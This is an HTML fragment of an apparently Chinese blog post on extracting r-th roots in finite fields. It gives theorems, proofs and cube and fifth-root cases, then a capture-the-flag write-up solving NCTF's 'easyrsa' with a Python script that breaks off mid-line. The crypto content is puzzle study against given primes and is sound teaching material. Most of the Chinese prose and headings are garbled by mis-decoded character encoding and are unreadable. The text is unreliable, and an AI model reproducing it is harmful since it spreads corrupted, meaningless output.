id="å®šç†1ï¼šåœ¨åŸŸFqä¸­ï¼Œç»™å®šä¸€ä¸ªræ¬¡å¹‚cï¼Œå­˜åœ¨ä¸€ä¸ªbï¼Œä½¿å¾—-c-r-1-cdot-b-cdot-r-å…·æœ‰-r-t-é˜¶ï¼Œï¼ˆ-t-lt-s-ï¼‰"><a href="#å®šç†1ï¼šåœ¨åŸŸFqä¸­ï¼Œç»™å®šä¸€ä¸ªræ¬¡å¹‚cï¼Œå­˜åœ¨ä¸€ä¸ªbï¼Œä½¿å¾—-c-r-1-cdot-b-cdot-r-å…·æœ‰-r-t-é˜¶ï¼Œï¼ˆ-t-lt-s-ï¼‰" class="headerlink" title="å®šç†1ï¼šåœ¨åŸŸFqä¸­ï¼Œç»™å®šä¸€ä¸ªræ¬¡å¹‚cï¼Œå­˜åœ¨ä¸€ä¸ªbï¼Œä½¿å¾—$c^{(r-1)\cdot b}\cdot r$ å…·æœ‰$r^t$é˜¶ï¼Œï¼ˆ$t&lt;s$ï¼‰"></a>å®šç†1ï¼šåœ¨åŸŸFqä¸­ï¼Œç»™å®šä¸€ä¸ªræ¬¡å¹‚cï¼Œå­˜åœ¨ä¸€ä¸ªbï¼Œä½¿å¾—$c^{(r-1)\cdot b}\cdot r$ å…·æœ‰$r^t$é˜¶ï¼Œï¼ˆ$t&lt;s$ï¼‰</h4><h5 id="è¯æ˜ï¼š"><a href="#è¯æ˜ï¼š" class="headerlink" title="è¯æ˜ï¼š"></a>è¯æ˜ï¼š</h5><p>æˆ‘ä»¬è®¾ä¸€ä¸ª$l$ï¼Œæ»¡è¶³$gcd(l,r)=1$,é‚£ä¹ˆå­˜åœ¨$Î² (0â‰¤Î²&lt;l)$ï¼Œæ»¡è¶³ $rÎ²+râˆ’1 \equiv  0 \pmod{ l}$å³å­˜åœ¨$Î±$ï¼Œæ»¡è¶³ $rÎ² + râˆ’1 = lÎ±.$</p><p>ç„¶åï¼Œæˆ‘ä»¬è®¾ä¸€ä¸ª $Î¶$ ä¸ºï¼Œ</p><p>$Î¶ = (c^a)^\frac{q-1}{r^2}$</p><p>åˆ™æœ‰</p><p>$Î¶ = (c^a)^\frac{q-1}{r^2}$</p><p> = $(c^a)^\frac{q-1}{r^2}c^{rÎ²+r-1-lÎ±} = c^{r-1}c^{rÎ²}(c^Î±)^\frac{q-1}{r^s}c^{-lÎ±}$</p><p> = $c^{r-1}{c^Î²(c^Î±)^\frac{q-1-lr^s}{r^{s+1}}}^r = c^{r-1}b^r$</p><p>å…¶ä¸­ï¼Œ$b = c^Î²(c^Î±)^\frac{q-1-lr^s}{r^{s+1}}$</p><p>å› ä¸º$c$æ˜¯åŸŸ$F_q$ä¸­çš„$r$æ¬¡å¹‚ï¼Œæ•…$Î¶$æ‹¥æœ‰$r^t$é˜¶ï¼Œ$(0â‰¤t&lt;s) $ï¼ˆä¸ºå•¥è¿™é‡Œ$t$å°±å°äº$s$äº†ï¼Œæ±‚æŒ‡ç‚¹~ï¼‰</p><h5 id="åˆ©ç”¨ï¼š"><a href="#åˆ©ç”¨ï¼š" class="headerlink" title="åˆ©ç”¨ï¼š"></a>åˆ©ç”¨ï¼š</h5><p>åœ¨åŸŸ$F_q$ä¸­ï¼Œæˆ‘ä»¬ä»¤ $Î¾ $ä¸º ä¸€ä¸ª$r^2$é˜¶æœ¬åŸå•ä½æ ¹ï¼Œ$Î¾$å¯ä»¥é€šè¿‡å…¬å¼$Î¾ = d^\frac{q-1}{r^s}$</p><p>è®¡ç®—å¾—åˆ°ï¼Œå…¶ä¸­$d$ä¸ºåŸŸ$F_q$ä¸­çš„é$r$æ¬¡å¹‚ï¼Œè¿™æ ·çš„$d$å¯ä»¥éšæœºé€‰å–ï¼Œåœ¨åŸŸ$F_q$ä¸­æ‰¾åˆ°å®ƒçš„æ¦‚ç‡ä¸º$\frac{r-1}{r}$</p><p>ç”±æ­¤ï¼Œæˆ‘ä»¬è®¾$Î¾^{r^{s-t}}$ä¸€ä¸ª$r^t$é˜¶çš„æœ¬åŸå•ä½æ ¹ï¼Œåˆ™å­˜åœ¨ä¸€å¯¹å”¯ä¸€ç¡®å®šçš„$iï¼Œj$æ»¡è¶³</p><p>$Î¾^{r^{s-t}} = Î¶^i, Î¶ = (Î¾^{r^{s-t}})^j$</p><p>å› ä¸º$Î¶ = (Î¾^{r^{s-t}})^j = Î¶^{ij}$, æ‰€ä»¥æˆ‘ä»¬æœ‰ $ij \equiv 1 \pmod{r^t}$</p><p>ç”±æ­¤æˆ‘ä»¬å°†å±•ç°ä¸€ä¸ªæ–°çš„å®šç†ï¼Œåœ¨åˆé€‚çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ç”¨ä¸€æ¬¡æŒ‡æ•°è¿ç®—å¯ä»¥æ‰¾åˆ°$r$æ¬¡å‰©ä½™çš„ä¸€ä¸ª$r$æ¬¡æ ¹ï¼Œ</p><h4 id="å®šç†2ï¼šå®šä¹‰-u-equiv-jÂ·-r-t-âˆ’1-Â·r-sâˆ’tâˆ’1-equiv-âˆ’jr-sâˆ’tâˆ’1-pmod-r-sâˆ’1-é‚£ä¹ˆåœ¨åŸŸ-F-q-ä¸­-c-çš„ä¸€ä¸ª-r-æ¬¡æ ¹ä¸º-cbÎ¾-u-ï¼Œå…¶ä¸­-b-åœ¨å®šç†1ä¸­ç»™å‡ºã€‚"><a href="#å®šç†2ï¼šå®šä¹‰-u-equiv-jÂ·-r-t-âˆ’1-Â·r-sâˆ’tâˆ’1-equiv-âˆ’jr-sâˆ’tâˆ’1-pmod-r-sâˆ’1-é‚£ä¹ˆåœ¨åŸŸ-F-q-ä¸­-c-çš„ä¸€ä¸ª-r-æ¬¡æ ¹ä¸º-cbÎ¾-u-ï¼Œå…¶ä¸­-b-åœ¨å®šç†1ä¸­ç»™å‡ºã€‚" class="headerlink" title="å®šç†2ï¼šå®šä¹‰$u \equiv  jÂ·(r^t âˆ’1)Â·r^{sâˆ’tâˆ’1} \equiv âˆ’jr^{sâˆ’tâˆ’1} \pmod{ r^{sâˆ’1}}$. é‚£ä¹ˆåœ¨åŸŸ$F_q$ä¸­$c$çš„ä¸€ä¸ª$r$æ¬¡æ ¹ä¸º $cbÎ¾^u$ ï¼Œå…¶ä¸­$b$åœ¨å®šç†1ä¸­ç»™å‡ºã€‚"></a>å®šç†2ï¼šå®šä¹‰$u \equiv  jÂ·(r^t âˆ’1)Â·r^{sâˆ’tâˆ’1} \equiv âˆ’jr^{sâˆ’tâˆ’1} \pmod{ r^{sâˆ’1}}$. é‚£ä¹ˆåœ¨åŸŸ$F_q$ä¸­$c$çš„ä¸€ä¸ª$r$æ¬¡æ ¹ä¸º $cbÎ¾^u$ ï¼Œå…¶ä¸­$b$åœ¨å®šç†1ä¸­ç»™å‡ºã€‚</h4><h5 id="è¯æ˜ï¼š-1"><a href="#è¯æ˜ï¼š-1" class="headerlink" title="è¯æ˜ï¼š"></a>è¯æ˜ï¼š</h5><p><img src="https://i.loli.net/2020/04/30/FqjtHNywcsbEBp3.png" alt="2"></p><p>(ç”±äº $Î¾ = d^\frac{q-1}{r^s}$ ,ç”±è´¹é©¬å°å®šç†ï¼Œåœ¨$F_q$ä¸­ $Î¾^{r^s} = 1 $æ˜“è¯ )</p><p>è¯æ¯•ã€‚</p><p>æ³¨1ï¼š $ rÎ² + r âˆ’1 = lÎ±$å³ $r(Î² + l) + r âˆ’1 = l(Î± + r)$ã€‚è¿™è¯´æ˜ï¼Œ$Î± \pmod{r}  ï¼‰$æ˜¯ç¡®å®šçš„ï¼Œ$Î²\pmod{l}$æ˜¯ç¡®å®šçš„ï¼Œæ‰€ä»¥å¯¹äºä»»æ„çš„Î± æ»¡è¶³$Î±^\frac{q-1}{r^s}\equiv Î±l \equiv -1 \pmod{r}$,éƒ½æœ‰å”¯ä¸€ç¡®å®šçš„Î²æ»¡è¶³$rÎ² +r -1 = lÎ± (i.e., Î² = \frac{lÎ±+1-r}{r})$ã€‚ä½œè€…åœ¨è¿™é‡Œè¿˜åŠ äº†ä¸€å¥ï¼Œäº‹å®ä¸Šï¼Œæ¡ä»¶$rÎ² + râˆ’1âˆ’lÎ± = 0$ å¯ä»¥è½¬åŒ–ä¸º $rÎ² + râˆ’1âˆ’lÎ± \equiv  0 \pmod{ \frac{q-1}{r} }$å› ä¸º$c^\frac{q-1}{r}\equiv 1$ï¼ˆéš¾é“æ˜¯æ¬§æ‹‰åˆ¤åˆ«å®šç†çš„æ¨å¹¿ï¼Ÿï¼‰</p><p>æ³¨2ï¼šcbçš„å€¼å¯ä»¥åŒ–æˆ</p><p><img src="https://i.loli.net/2020/04/30/hMW1s87FiGQRC6g.png" alt="cb"></p><p>å…¶ä¸­$Î±$æ˜¯ä¸€ä¸ªæ•´æ•°$ï¼ˆ0&lt;Î±&lt;rï¼‰$ï¼Œæ»¡è¶³$1+Î±^\frac{q-1}{r^s}\equiv 0 \pmod{r}$æ‰€ä»¥bä¹Ÿå¯ä»¥è¡¨ç¤ºä¸º</p><p>$b = cb/c = c^\frac{l+a^\frac{q-1}{r^s}-r}{r}$</p><p>æ³¨3ï¼šå¯¹äº $ij \equiv  1 \pmod{ r^t}$ ï¼Œå½“$r^t$å¾ˆå¤§ï¼ˆ$t&gt;1$ å¹¶ä¸”åœ¨$r^t$é˜¶å¾ªç¯ç¾¤ä¸­çš„ç¦»æ•£å¯¹æ•°å¾ˆéš¾å¤„ç†ï¼‰æ—¶ï¼Œå…¶ä¸­çš„$i$å’Œ$j$æ‰¾èµ·æ¥æ˜¯æ¯”è¾ƒå›°éš¾çš„ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•é€‚åˆåœ¨$r$å’Œ$t$éƒ½æ¯”è¾ƒå°çš„æ—¶å€™ï¼Œä¹Ÿå¯ä»¥è¢«è§†ä½œæ˜¯å¦ä¸€ä¸ªç‰ˆæœ¬çš„Adleman-Manders-Miller algorithmã€‚</p><h4 id="ä¸¾ä¾‹ä¸ç®—æ³•"><a href="#ä¸¾ä¾‹ä¸ç®—æ³•" class="headerlink" title="ä¸¾ä¾‹ä¸ç®—æ³•"></a>ä¸¾ä¾‹ä¸ç®—æ³•</h4><p>ç»ˆäºåˆ°å®ä¾‹ç¯èŠ‚äº†~</p><h5 id="ä¾‹1-q-equiv-lr-1-pmod-r-2-0-lt-l-lt-r"><a href="#ä¾‹1-q-equiv-lr-1-pmod-r-2-0-lt-l-lt-r" class="headerlink" title="ä¾‹1 $q \equiv  lr + 1 \pmod{ r^2} 0 &lt; l &lt; r$:"></a>ä¾‹1 $q \equiv  lr + 1 \pmod{ r^2} 0 &lt; l &lt; r$:</h5><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ$s=1$,æ‰€ä»¥$t=u=0$ï¼Œæ‰€ä»¥$r$æ¬¡æ ¹$c$å¯ä»¥è¡¨ç¤ºä¸º$cbÎ¾^u = cb = c^\frac{l+a^\frac{q-1}{r^s}}{r}$</p><p>å…¶ä¸­Î±éœ€è¦æ»¡è¶³$1+a^\frac{q-1}{r}\equiv 0\pmod {r}$ å½“$r = 2ï¼Œs=1$å°±æ„å‘³ç€ï¼Œ$ q \equiv  3 \pmod{ 4}$ ï¼Œ$Î±$åœ¨è¿™é‡Œå¯ä»¥ç®—å‡ºæ˜¯1ï¼Œå¸¦å…¥å…¬å¼ï¼Œ$c$çš„ä¸€ä¸ªäºŒæ¬¡æ ¹å°±æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„$c^\frac{p+1}{4}$ï¼Œï¼ˆRabinè§£å¯†~ï¼‰</p><p>å½“$r = 3ï¼Œs=1$ å°±æ„å‘³ç€ $q \equiv  4 \pmod{ 9}$ æˆ–è€… $q \equiv  7 \pmod{ 9}$ï¼Œå…ˆç®—å‡º$Î±$ï¼Œç„¶åå¸¦å…¥å…¬å¼</p><p>$c^\frac{1+2\frac{q-1}{3}}{3}= c^\frac{2q+1}{9}$ï¼Œï¼ˆ$å½“ q \equiv  4 \pmod{ 9}$) æˆ–æ˜¯$c^\frac{1+1^\frac{q-3}{3}}{3} = c^\frac{q+2}{9} $ï¼ˆå½“ $q \equiv  7 \pmod{ 9}$)</p><p>è¿™é‡Œæœ‰ä¸ªè¡¨<img src="https://i.loli.net/2020/04/30/s4nvIGrOZeBEafo.png" alt="table"></p><p>æœ€åº•ä¸‹ä¸€æ ·æœ‰ä¾‹å¤–ï¼Œæ­¤æ—¶ä¹Ÿå°±ä»¥ä¸ºç€$r=0ï¼Œr=0.$è¿˜æœ‰å•¥æ ¹å¯å¼€~</p><p>å¯è§ï¼Œå½“$s=1$æ—¶ï¼Œåœ¨ $q \equiv  1 \pmod{ r}$ å¹¶ä¸” $q !\equiv  1 \pmod{ r^2}$ æ—¶ï¼Œå³$q$çš„$(r-1) $ç§æƒ…å†µéƒ½å¯ä»¥å€Ÿè¯¥å…¬å¼è¿›è¡Œä¸€æ¬¡æŒ‡æ•°è¿ç®—å°±å¯å¼€æ ¹ï¼Œå¾—åˆ°ä¸€ä¸ªè§£ã€‚ï¼ˆæ¨ç†è¿‡ç¨‹ä¸€çŸ¥åŠè§£çš„ï¼Œä½†æ˜¯ç»“è®ºç”¨èµ·æ¥æ˜¯çœŸçš„é¦™ï¼‰</p><h5 id="ä¾‹2-q-equiv-lr-2-1-pmod-r-3-0-lt-l-lt-r"><a href="#ä¾‹2-q-equiv-lr-2-1-pmod-r-3-0-lt-l-lt-r" class="headerlink" title="ä¾‹2 $q \equiv  lr^2 + 1 \pmod{ r^3} 0 &lt; l &lt; r$:"></a>ä¾‹2 $q \equiv  lr^2 + 1 \pmod{ r^3} 0 &lt; l &lt; r$:</h5><p>å½“$s=2$.é‚£ä¹ˆ$Î¶ = (c^Î±)^\frac{q-1}{r^2}=1$)æˆ–è€… æ˜¯ä¸€ä¸ª$r$é˜¶æœ¬åŸå•ä½æ ¹ ï¼ˆ$Î¶$æ˜¯$r^t$é˜¶ï¼Œ$t$=0 or 1ï¼‰ï¼ŒåŒæ—¶$Î¾$ä¹Ÿæ˜¯ä¸€ä¸ª$r^2$é˜¶çš„æœ¬åŸå•ä½æ ¹ï¼ˆåŸæ ¹ï¼‰æ»¡è¶³ï¼š$Î¾^{r^2-t} = Î¶^i å³ (Î¾^{r^2-t})^j =Î¶ $   with $ij\equiv 1 \pmod{r^t}$</p><p>å› æ­¤ï¼Œ$r$æ¬¡æ ¹å¯ä»¥è¡¨ç¤ºä¸º $cbÎ¾^u$ ï¼Œå…·ä½“çš„å€¼ä¸Šæ–‡å·²ç»™ï¼Œå½“$t=0ï¼Œu=0ï¼Œx=cb$æ˜¯ä¸€ä¸ª$r$æ¬¡æ ¹ï¼Œå½“$t=1,u \equiv âˆ’j \pmod{ r}$ ï¼Œ$x= cbÎ¾^{âˆ’j}$æ˜¯ä¸€ä¸ª$r$æ¬¡æ ¹ã€‚ï¼ˆæ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯å¸Œæœ›$t=0$ï¼Œè¿™æ ·è®¡ç®—å°±ä¼šæå…¶æ–¹ä¾¿~ï¼‰</p><h6 id="Algorithm-3-Our-cube-root-algorithm-when-q-equiv-1-pmod-9-and-q-Ì¸-equiv-1-pmod-27"><a href="#Algorithm-3-Our-cube-root-algorithm-when-q-equiv-1-pmod-9-and-q-Ì¸-equiv-1-pmod-27" class="headerlink" title="Algorithm 3 Our cube root algorithm when $q \equiv  1 \pmod{ 9}$ and $q Ì¸\equiv  1 \pmod{ 27}$"></a>Algorithm 3 Our cube root algorithm when $q \equiv  1 \pmod{ 9}$ and $q Ì¸\equiv  1 \pmod{ 27}$</h6><p>$x^3\equiv c \pmod{ q}$ $ (q = 9l + 1 \pmod{ 27}$ with  $ l = 1,2, i.e.$, $q \equiv  10,19 \pmod{ 27}$</p><p><img src="https://i.loli.net/2020/04/30/QYibS8IanCMRBjP.png" alt="Our cube root algorithm"></p><p>è§£è¯»ä¸€ä¸‹ï¼š$Î¾ = d^\frac{q-1}{r^s}$ï¼Œå…¶ä¸­$d$åœ¨åŸŸ$F_q$ç§ä¸æ˜¯ä¸€ä¸ª$r$æ¬¡å¹‚ï¼ˆéå†ä¸€ä¸‹ï¼Œéšä¾¿å–ä¸€ä¸ªå°±å¥½ï¼‰ã€‚</p><p>$Î¶=c^{râˆ’1Â·b}r = c^{2Â·b}3=X^{2b}$</p><p>å¦‚æœï¼Œ$Î¶=1$ï¼Œåˆ™è¯´æ˜$t=0$ï¼Œé‚£ä¹ˆ$x=cb=X$</p><p>å¦‚æœï¼Œ$Î¶=B=Î¾^r$ï¼Œé‚£ä¹ˆ$t=j=1$,$x=cbÎ¾^{-j}=cbÎ¾^2=XA^2$</p><p>å¦åˆ™ï¼Œ$j=2,x=cbÎ¾^{-j}=cbÎ¾^{-2}=XA$</p><p>éªŒè¯ï¼š</p><p><img src="https://i.loli.net/2020/04/30/DJIlwucFAOGNSCP.png" alt="check"></p><p>æˆåŠŸ~</p><p>ä»¥ä¸‹åŒ</p><h6 id="Algorithm-4-Our-5-th-root-algorithm-when-q-equiv-1-pmod-25-and-q-equiv-1-pmod-125"><a href="#Algorithm-4-Our-5-th-root-algorithm-when-q-equiv-1-pmod-25-and-q-equiv-1-pmod-125" class="headerlink" title="Algorithm 4 Our 5-th root algorithm when $q \equiv  1 \pmod{ 25}$and$ q \equiv  1 \pmod{ 125}$"></a>Algorithm 4 Our 5-th root algorithm when $q \equiv  1 \pmod{ 25}$and$ q \equiv  1 \pmod{ 125}$</h6><p>$x^5=c \pmod{ q}$($q \equiv  25l + 1 \pmod{ 125}$with$ l = 1,2,3,4, $i.e., $q \equiv  26,51,76,101 \pmod{ 125}$)</p><p><img src="https://i.loli.net/2020/04/30/GpdjI3LEmOABuwb.png" alt="Algorithm 4 Our 5-th root algorithm"></p><h5 id="ä¾‹3-q-equiv-lr-3-1-pmod-r-4-0-lt-l-lt-r"><a href="#ä¾‹3-q-equiv-lr-3-1-pmod-r-4-0-lt-l-lt-r" class="headerlink" title="ä¾‹3 $q \equiv  lr^3 + 1 \pmod{ r^4} 0 &lt; l &lt; r:$"></a>ä¾‹3 $q \equiv  lr^3 + 1 \pmod{ r^4} 0 &lt; l &lt; r:$</h5><p>å½“$s=3$ï¼Œ$Î¶ = (c^Î±)^\frac{q-1}{r^3} = 1$ æœ‰$r^t$é˜¶$ï¼ˆt=0,1,2ï¼‰$ï¼ŒåŒæ—¶ $Î¾ $æ˜¯ä¸€ä¸ª$r^3 $é˜¶çš„åŸæ ¹ ï¼Œæ»¡è¶³ï¼š</p><p>$Î¾^{r^3-t} = Î¶^i $ and $(Î¾^{r^3-t})^j = Î¶$ with $ij \equiv 1 \pmod {r^t}$</p><p>æ‰€ä»¥ï¼Œ$c$çš„$r$æ¬¡æ ¹å¯ä»¥è¡¨ç¤ºä¸º$cbÎ¾^u$ï¼Œå½“$t=0ï¼Œu=0,x=cb$å³æ˜¯$c$çš„ä¸€ä¸ª$r$æ¬¡æ ¹ï¼Œå½“$t=1$ï¼Œ</p><p>$u \equiv  âˆ’jr \pmod{ r^2}$, å½“$t=2$ï¼Œ $u \equiv  âˆ’j \pmod{ r^2}$,</p><p>è®¡ç®—è¿‡ç¨‹ç±»æ¯”ä¸Šæ–‡ï¼Œåªæ˜¯è¦è€ƒè™‘çš„ï¼ˆ$u$ï¼‰çš„æƒ…å†µå¢åŠ åˆ°äº†r^2ç§ã€‚</p><h3 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h3><p>å›åˆ°å¼€å¤´è¯´çš„NCTF cryptoå…¨åœºä¸¤è§£ï¼ˆå¤§ä½¬éƒ½å»éš”å£æ‰“D3äº†~ï¼‰çš„å‹è½´â€”â€”easyrsa</p><p>é¢˜ç›®ï¼šï¼ˆæ•°å­—å¤ªå¤§ï¼Œå°±çœå»äº†ï¼‰</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from rsav import * </span><br><span class="line"> </span><br><span class="line">e = 0x1337 </span><br><span class="line">p =  </span><br><span class="line">q =  </span><br><span class="line">n = p * q </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">''' </span><br><span class="line">assert(flag.startswith('NCTF')) </span><br><span class="line">m = int.from_bytes(flag.encode(), 'big') </span><br><span class="line">assert(m.bit_length() &gt; 1337) </span><br><span class="line"> </span><br><span class="line">c = pow(m, e, n) </span><br><span class="line">print(c)''' </span><br><span class="line">c=</span><br></pre></td></tr></table></figure><p>è§£é¢˜æ€è·¯ï¼š</p><p>å¾ˆæ™®é€šçš„åŠ å¯†æ‰‹æ®µï¼Œç„¶å$p,q$éƒ½ç»™äº†ï¼Œå…¶ä¸­ï¼Œ$e|q-1ï¼›e|p-1$</p><p>å”¯ä¸€éš¾ç‚¹å°±åœ¨$e$æ˜¯$Ï†(n)$çš„ä¸€ä¸ªå› å­æ‰€ä»¥æ ¹æœ¬æ— æ³•æ±‚å‡ºç§é’¥$d$</p><p>ç¬¬ä¸€æ­¥æ˜¯ç±»ä¼¼rabinï¼Œå…ˆå°†$m^e \equiv  c \pmod{ n}$åˆ†è§£æˆåŒä½™å¼ç»„</p><p>$m^e \equiv  c \pmod{ p}$</p><p>$m^e \equiv  c \pmod{ q}$</p><p>æ±‚å‡º$m_1$å’Œ$m_2$ï¼Œå†ç”¨CRTå°±å¥½äº†</p><p>è‡³äºmçš„æ±‚è§£ï¼Œæœ¬é¢˜çš„æ¡ä»¶æ­£å¥½ç¬¦åˆä¸Šæ–‡çš„ä¾‹1ï¼Œ</p><p><img src="https://i.loli.net/2020/04/30/SLkGiW31DNThBdl.png" alt="context"></p><p>äºæ˜¯æˆ‘ä»¬å…ˆéå†å‡º$Î±$ï¼Œç„¶åå°±å¯ä»¥æ±‚å¾—$m_1$äº†ï¼Œ</p><p>å†ç®—å‡ºå¦ä¸€ä¸ª$Î±$ï¼Œå¾—åˆ°$m_2$ï¼Œç„¶åCRTèµ°ä¸€æ³¢ï¼Œå°±å¯ä»¥å‡ºæ˜æ–‡çš„ä¸€ç§æƒ…å†µäº†ï¼Œ</p><p>ç„¶è€Œä¸€å…±æœ‰$e^2$ç§æƒ…å†µ</p><p>å½“$e=2$ï¼Œrabinè§£å¯†ï¼Œæœ‰$e^2$ç§æƒ…å†µï¼Œå› ä¸ºåŒä½™æ–¹ç¨‹ç»„é‡Œçš„æ¯ä¸€ä¸ªæ–¹ç¨‹éƒ½æœ‰ä¸¤ç§æƒ…å†µã€‚</p><p>å½“$e=3$ï¼Œæ¯ä¸ªå°±æœ‰ä¸‰ç§ï¼ŒCRTåä¸€å…±å°±æœ‰$3^2$ç§</p><p>æ ¹æ®<a href="https://crypto.stackexchange.com/questions/63614/finding-the-n-th-root-of-unity-in-a-finite-field" target="_blank" rel="noopener">hint2</a>ï¼Œé‡Œé¢æœ‰æä¾›å½“æ‰¾åˆ°ä¸€ç§è§£åæ‰¾åˆ°å…¶ä½™è§£çš„ç®—æ³•</p><p><img src="https://i.loli.net/2020/04/30/VQF7UhL3DBORW4I.png" alt="sol"></p><p>åœ¨æœ‰é™åŸŸ$F_q$ä¸­ï¼Œä¹˜æ³•å­ç¾¤çš„é˜¶ä¸º$q-1$ï¼Œå¦‚æœ$n$ä¸æ»¡è¶³$n|q-1$ï¼Œé‚£ä¹ˆ$n$æ¬¡å•ä½æ ¹åªæœ‰1æœ¬èº«ï¼Œå¦‚æœ$n$æ»¡è¶³$n|q-1$ï¼Œé‚£ä¹ˆå°±æœ‰$n$ä¸ªå•ä½æ ¹ã€‚</p><p>ç”±è´¹é©¬å°å®šç†$(x^\frac{q-1}{n})^n = x^{q-1} = 1$        æ‰€ä»¥æˆ‘ä»¬æœ‰næ¬¡å•ä½æ ¹$x^\frac{q-1}{n}$</p><p>å½“æˆ‘ä»¬è¿™ä¸ªnæ¬¡å•ä½æ ¹ä¸ç­‰äº1æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å®ƒå’Œæˆ‘ä»¬æ‰¾åˆ°çš„ä¸€ä¸ªæ ¹æ¥ç”Ÿæˆä¸€ä¸ªé˜¶ä¸º$n$çš„å¾ªç¯ç¾¤ï¼Œè¿™ä¸ªç¾¤é‡Œæ‰€æœ‰çš„å…ƒç´ å³ä¸ºæˆ‘ä»¬æƒ³è¦çš„æ‰€æœ‰çš„æ ¹ã€‚</p><p>è¿™æ ·æˆ‘ä»¬æ„é€ expï¼Œéå†è¿™0x1337*0x1337=24196561ç§å¯èƒ½ï¼Œå°±èƒ½è§£å‡ºçœŸæ­£çš„å¯†æ–‡äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2s</span><span class="params">(x)</span>:</span> </span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        <span class="keyword">try</span>: </span><br><span class="line">            flag = hex(x)[<span class="number">2</span>:].decode(<span class="string">"hex"</span>) </span><br><span class="line">        <span class="keyword">except</span>: </span><br><span class="line">            flag = hex(x)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">"hex"</span>) </span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">        flag=<span class="string">''</span> </span><br><span class="line">    <span class="keyword">return</span> flag </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">onemod</span><span class="params">(p,r)</span>:</span> </span><br><span class="line">    t=p<span class="number">-2</span> </span><br><span class="line">    <span class="keyword">while</span> pow(t,(p<span class="number">-1</span>)/r,p)==<span class="number">1</span>: t-=<span class="number">1</span> </span><br><span class="line">    <span class="keyword">return</span> pow(t,(p<span class="number">-1</span>)/r,p) </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span><span class="params">(p,root)</span>:</span>  </span><br><span class="line">    g=onemod(p,<span class="number">0x1337</span>) </span><br><span class="line">    may=[] </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x1337</span>): </span><br><span class="line">        may.append(root*pow(g,i,p)%p) </span><br><span class="line">    <span class="keyword">return</span> may </span><br><span class="line"> </span><br><span class="line">c =  </span><br><span class="line"> </span><br><span class="line">p =  </span><br><span class="line"> </span><br><span class="line">q =  </span><br><span class="line">e = <span class="number">0x1337</span> </span><br><span class="line">n = p*q </span><br><span class="line"> </span><br><span class="line">c_p = pow(c,(<span class="number">1</span>+<span class="number">3307</span>*(p<span class="number">-1</span>)/e)/e,p)  <span class="comment">#på¯¹åº”çš„Î±=3307 </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"find one"</span> </span><br><span class="line">C1=solution(p,c_p)[::<span class="number">-1</span>]   <span class="comment">#é€†åºï¼Œé—®é¢˜ä¸å¤§ï¼Œåªæ˜¯è·‘è¿‡ä¸€æ¬¡ï¼Œå‘ç°ç­”æ¡ˆåœ¨ä¸¤åƒå¤šä¸‡æ¬¡å </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"find all"</span> </span><br><span class="line">c_q = pow(c,(<span class="number">1</span>+(<span class="number">2649</span>*(q<span class="number">-1</span>)/e))/e,q) <span class="comment">#qå¯¹åº”çš„Î±=2649 </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"find another"</span> </span><br><span class="line">C2=solution(q,c_q)[::<span class="number">-1</span>] </span><br><span class="line"><span class="keyword">print</span> <span class="string">"find all"</span> </span><br><span class="line">a= gmpy2.invert(p,q) </span><br><span class="line">b = gmpy2.invert(q,p) </span><br><span class="line"><span class="comment">#x = (b*q*c_p+a*p*c_q)%n </span></span><br><span class="line">flag=<span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C1: </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> C2: </span><br><span class="line">        flag+=<span class="number">1</span> </span><br><span class="line">        <span class="keyword">if</span> flag%<span class="number">1000000</span> == <span class="number">0</span>: </span><br><span class="line">            <span class="keyword">print</span> flag </span><br><span class="line">        x = (b*q*i+a*p*j)%n </span><br><span class="line">        <span class="keyword">if</span> <span 